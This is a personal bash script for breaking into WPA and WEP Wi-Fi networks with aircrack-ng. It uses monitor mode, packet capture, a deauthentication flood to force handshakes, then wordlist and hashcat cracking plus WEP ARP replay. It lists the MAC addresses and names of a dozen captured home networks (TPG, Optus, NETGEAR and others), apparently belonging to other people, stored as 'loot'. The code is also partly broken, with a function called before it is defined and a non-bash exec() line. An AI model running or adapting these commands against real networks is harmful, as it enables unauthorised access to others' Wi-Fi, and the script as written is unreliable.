#! /bin/bash
## AirMon/Crack-Ng - TPG xxxx

LOOTDIR=/root/Dropbox/blackHattery/loot
WORDLISTDIR=/root/Dropbox/blackHattery/customWordlists
TARGETDIR=/root/Dropbox/blackHattery/targets
WORDLIST=tpglist.txt
TARGETLIST=tpgtargets.txt

INTERF=wlan1
MONFACE=wlan1mon

TPGTARGETID=

for i in $TPGTARGETID
do
    hitEm
done

hitEm(){
    BSSID=$1
    CHANNEL=$2
    # start network device, put into monitor mode, listen beacon frames to get target BSSID and channel
    airmon-ng start $INTERF || echo "error starting $INTERF" && exit
    # capture packets
    # - choose BSSID to target
    airodump-ng $MONFACE
    # -target chosen network to monitor
    airodump-ng -c $CHANNEL --bssid $BSSID --write $LOOTDIR/$CHANNEL-$BSSID.cap $MONFACE
    # (write output to $FILE)
    #deauth to get handshake
    exec('aireplay-ng --deauth 100 -a $BSSID $MONFACE')
    #
    ###
    echo "offline from here -- if you have a good valid handshake"
    # crack w/ password list
    aircrack-ng $LOOTDIR/$CHANNEL-$BSSID.cap -w $WORDLISTDIR/$WORDLIST
aircrack-ng -C $BSSID $BSSID2
}

aircrack-ng -w /root/crackstation.txt -l /root/thekey -C 7C:26:64:4A:E9:D1 18:F1:45:7C:41:30 F4:6B:EF:B7:8B:0B 88:D2:74:8A:E8:68 18:F1:45:25:C8:70 18:F1:45:1F:A0:46 74:44:01:81:62:80 24:7F:20:6F:2F:C2 9C:3D:CF:BC:E6:7E A0:63:91:6D:19:1A 18:F1:45:5F:96:BF 18:F1:45:65:49:34 /root/Dropbox/blackHattery/loot/cap/wpa2.cap


 NetComm  2976  WPA  (1 handshake)
 BelongJMPMT6QG  WPA  (1 handshake)
 TPG  4933  WPA  (1 handshake)
NetComm  1609  WPA  (1 handshake)
NETGEAR08  WPA  (1 handshake)
NETGEAR40  WPA  (1 handshake)
FineThen  WPA  (1 handshake)
iiNet9756F1  WPA  (1 handshake)
 TPG  B441  WPA  (1 handshake)
 	ZTE_H268A8AE868  WPA  (1 handshake)
	 OPTUS_6F2FC1  WPA  (1 handshake)
 OPTUS_B78B0A  WPA  (1 handshake)

otherOptions(){

    ########## or crack password with naive-hashcat ##########
    # convert cap to hccapx
    cap2hccapx.bin capture/-01.cap capture/-01.hccapx
    # crack with naive-hashcat
    HASH_FILE=hackme.hccapx POT_FILE=hackme.pot HASH_TYPE=2500 ./naive-hashcat.sh



    ######## or WEP ones using IVs #####
    ## spoof and ARP attack
    # We will be capturing an ARP packet and then replaying that ARP thousands of times in order to generate the IVs that we need to crack WEP.

    aireplay-ng -3 -b $BSSID -h $MAC2SPOOF $MONFACE
    # once you have thousands of IVs ...
    aircrack-ng $WEPFILE.cap
}
